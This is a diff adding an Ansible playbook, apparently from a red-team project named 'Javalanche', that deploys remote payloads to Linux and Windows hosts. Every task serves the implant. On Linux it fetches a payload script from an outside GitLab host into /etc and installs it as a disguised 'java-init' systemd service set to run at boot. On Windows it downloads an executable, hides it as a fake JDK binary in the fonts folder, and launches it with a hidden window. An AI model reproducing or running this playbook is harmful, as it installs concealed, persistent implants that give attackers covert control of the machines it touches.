@@ -1,0 +1,45 @@
+---
+  - name: Javalanche | Define Linux Distros
+    set_fact:
+      linux_distros: ["RedHat", "CentOS", "Fedora", "Scientific", "CloudLinux", "OracleLinux", "Amazon", "XenServer", "Debian", "Ubuntu", "SUSE", "SLED", "SLES", "Gentoo", "Archlinux", "Mandrake", "Alpine"]
+
+  - name: Linux Download Agent
+    get_url:
+      url: https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/linuxPayload.sh?ref_type=heads
+      dest: /etc/javalanche.sh
+      mode: '0755'
+    when: ansible_os_family in linux_distros
+
+  - name: Linux Download Service file
+    get_url:
+      url: https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/java-init.service?ref_type=heads
+      dest: /lib/systemd/system/java-init.service
+      mode: 644
+    when: ansible_os_family in linux_distros
+
+  - name: Linux Reload Service Daemons
+    systemd:
+      daemon_reload: yes
+    when: ansible_os_family in linux_distros
+
+  - name: Linux Stop Service
+    service:
+      name: java-init
+      state: stopped
+    when: ansible_os_family in linux_distros
+
+  - name: Linux Start and Enable Service
+    service:
+      name: java-init
+      enabled: yes
+      state: started
+    when: ansible_os_family in linux_distros
+
+  - name: Windows Download agent
+    win_shell: wget -o C:\\Windows\\fonts\\jdk-23.0.1-bin-java.exe https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/windowsBinary/x64/Debug/windowsBinary.exe?ref_type=heads    
+    when: ansible_os_family == "Windows"
+  
+  - name: Windows Run Agent
+    win_shell: Start-Process C:\\Windows\\fonts\\jdk-23.0.1-bin-java.exe -WindowStyle Hidden
+    when: ansible_os_family == "Windows"
+
